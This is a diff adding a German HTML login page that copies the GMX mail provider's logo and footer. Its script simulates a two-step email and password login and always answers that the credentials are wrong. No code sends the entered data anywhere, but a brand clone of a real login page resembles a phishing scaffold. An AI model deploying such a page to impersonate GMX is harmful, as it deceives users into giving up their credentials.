@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="97" height="32" viewBox="0 0 123 40" aria-label="gmx-logo" data-testid="logo-brand" class="sc-kTLpXt icUIuL"><path fill="#000000" d="M109.42,18.84,120.08,1.09H109.2l-5.67,9-6.1-9H85.51L98.08,18.82l-12.57,20H97.43l6.8-11.37,8.06,11.37h10.64ZM70,1.09,61.91,21.28,54.24,1.09H44.57L38.15,38.87h9.77L51.08,17.1h.1l8.66,21.77h3.91L72.82,17.1h.12l2.75,21.77h9.82L79.79,1.09ZM20.2,17.8v7.68h8C27.78,29.79,24.52,32,20.3,32c-6.42,0-9.89-5.91-9.89-11.75S13.74,8.4,20.15,8.4c3.94,0,6.76,2.38,8.11,5.95l9.26-3.88C34.29,3.47,28.31,0,20.59,0,8.5,0,.25,8,.25,20.19.25,32,8.45,40,20.25,40c6.27,0,11.8-2.24,15.46-7.36C39,28,39.45,23.28,39.55,17.8Z"></path></svg>
+            
+            
+        </div>
+        <h2>Willkommen!</h2>
+        <p class="subtitle">Mit Account anmelden</p>
+
+        <div class="error-message" id="errorMessage"></div>
+
+        <form id="loginForm" novalidate>
+            <div class="form-group">
+                <input 
+                    type="email" 
+                    id="email" 
+                    placeholder="E-Mail" 
+                    autocomplete="email"
+                    required
+                >
+            </div>
+
+            <div class="form-group" id="passwordGroup">
+                <input 
+                    type="password" 
+                    id="password" 
+                    placeholder="Passwort" 
+                    autocomplete="current-password"
+                >
+            </div>
+
+            <button type="submit" class="btn-primary inactive" id="continueBtn" disabled>
+                Weiter
+            </button>
+        </form>
+
+        <a href="#" class="back-link" id="backLink">Zurück</a>
+
+        <hr class="divider">
+
+        <div class="register-section">
+            <p class="register-text">Oder neuen Account anlegen</p>
+            <a href="#" class="register-link">Jetzt registrieren</a>
+        </div>
+    </div>
+
+    
+
+    <footer class="footer">
+        <hr class="line">
+        <div class="footer-links">
+            <a href="#">AGB</a>
+            <a href="#">Impressum</a>
+            <a href="#" class="bold">Verträge hier kündigen/widerrufen</a>
+            <a href="#">Datenschutz</a>
+            <a href="#">Barrierefreiheit</a>
+            <a href="#">Feedback</a>
+        </div>
+    </footer>
+
+    <script>
+        (function() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const continueBtn = document.getElementById('continueBtn');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const loginForm = document.getElementById('loginForm');
+            const errorMessage = document.getElementById('errorMessage');
+            const backLink = document.getElementById('backLink');
+
+            let step = 1; // 1 = email entry, 2 = password entry
+
+            // Enable/disable button based on email input
+            emailInput.addEventListener('input', function() {
+                const email = emailInput.value.trim();
+                
+                if (email.length > 0) {
+                    continueBtn.classList.remove('inactive');
+                    continueBtn.classList.add('active');
+                    continueBtn.disabled = false;
+                } else {
+                    continueBtn.classList.remove('active');
+                    continueBtn.classList.add('inactive');
+                    continueBtn.disabled = true;
+                    
+                    // If user clears email, hide password field and reset
+                    if (step === 2) {
+                        passwordGroup.classList.remove('visible');
+                        passwordInput.value = '';
+                        step = 1;
+                        continueBtn.textContent = 'Weiter';
+                    }
+                }
+            });
+
+            // Handle form submission / button click
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                hideError();
+
+                const email = emailInput.value.trim();
+
+                if (step === 1) {
+                    // Validate email format
+                    if (!isValidEmail(email)) {
+                        showError('Bitte geben Sie eine gültige E-Mail-Adresse ein.');
+                        emailInput.focus();
+                        return;
+                    }
+
+                    // Show password field
+                    passwordGroup.classList.add('visible');
+                    passwordInput.focus();
+                    step = 2;
+
+                } else if (step === 2) {
+                    const password = passwordInput.value.trim();
+
+                    if (!password) {
+                        showError('Bitte geben Sie Ihr Passwort ein.');
+                        passwordInput.focus();
+                        return;
+                    }
+
+                    // Simulate login
+                    continueBtn.textContent = 'Anmelden...';
+                    continueBtn.disabled = true;
+
+                    setTimeout(function() {
+                        continueBtn.textContent = 'Weiter';
+                        continueBtn.disabled = false;
+                        showError('Die eingegebene E-Mail-Adresse oder das Passwort ist falsch.');
+                        passwordInput.value = '';
+                        passwordInput.focus();
+                    }, 1500);
+                }
+            });
+
+            // Back link behavior
+            backLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (step === 2) {
+                    // Go back to email step
+                    passwordGroup.classList.remove('visible');
+                    passwordInput.value = '';
+                    step = 1;
+                    emailInput.focus();
+                    hideError();
+                } else {
+                    // On step 1, could navigate away or do nothing
+                    window.history.back();
+                }
+            });
+
+            // Helper: validate email
+            function isValidEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+
+            // Helper: show/hide error
+            function showError(msg) {
+                errorMessage.textContent = msg;
+                errorMessage.classList.add('show');
+            }
+
+            function hideError() {
+                errorMessage.classList.remove('show');
+            }
+
+            // Focus email on load
+            window.addEventListener('DOMContentLoaded', function() {
+                emailInput.focus();
+            });
+        })();
+    </script>
+</body>
+</html>
